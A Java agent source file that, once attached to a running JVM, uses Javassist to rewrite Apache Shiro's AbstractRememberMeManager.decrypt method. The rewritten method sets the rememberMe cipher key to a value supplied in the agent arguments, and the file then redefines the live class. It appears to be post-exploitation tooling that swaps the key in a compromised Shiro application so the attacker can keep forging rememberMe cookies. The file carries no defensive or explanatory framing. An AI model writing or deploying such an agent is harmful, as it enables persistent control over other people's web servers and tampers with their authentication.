package com.alter.agent;

import javassist.*;

import java.io.FileWriter;
import java.io.IOException;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;
import java.lang.reflect.Modifier;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;


public class TestAgent {

    /**
     * 主要函数 agentmain
     *
     * @param inst Instrumentation对象
     */
    public static void agentmain(String agentArgs, Instrumentation inst) throws IOException {
        Class[] loadedClass = inst.getAllLoadedClasses();
        for (Class clazz : loadedClass){
            String className = clazz.getName();
            if (inst.isModifiableClass(clazz)){
                if (className.equals("org.apache.shiro.mgt.AbstractRememberMeManager")){
                    System.out.println(className);
                    try {
                        ClassPool classPool = new ClassPool(true);
                        classPool.insertClassPath(new ClassClassPath(clazz));
                        classPool.insertClassPath(new LoaderClassPath(clazz.getClassLoader()));
                        CtClass ctClass = classPool.get(clazz.getName());
                        CtMethod ctMethod = ctClass.getMethod("decrypt", "([B)[B");
                        ctMethod.insertBefore(String.format("java.lang.String temp = \"%s\";\n" +
                                "try{\n" +
                                "setCipherKey(org.apache.shiro.codec.Base64.decode(temp));\n" +
                                "}catch(java.lang.Throwable e){\n" +
                                "\n}\n",agentArgs));
                        inst.redefineClasses(new ClassDefinition(clazz,ctClass.toBytecode()));
                        ctClass.detach();
                    } catch (UnmodifiableClassException | CannotCompileException e) {
                        e.printStackTrace();
                    } catch (NotFoundException e) {
                        e.printStackTrace();
                    } catch (ClassNotFoundException e) {
                        e.printStackTrace();
                    }
                }

            }
        }
        }
}
